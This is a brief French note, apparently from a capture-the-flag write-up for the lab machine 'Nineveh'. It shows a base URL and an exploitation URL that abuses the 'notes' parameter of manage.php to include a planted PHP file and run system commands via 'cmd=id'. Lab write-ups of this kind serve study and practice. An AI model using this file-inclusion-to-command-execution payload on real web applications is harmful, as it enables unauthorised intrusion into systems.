Exemple machine Nineveh
```http
# url de base
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt

# Manipulation d'une application qui permettait de la nommé ninevehNotes il y avait un code php pour faire une requete system cmd
# Exploitation du paramètre notes
http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes&cmd=id
```

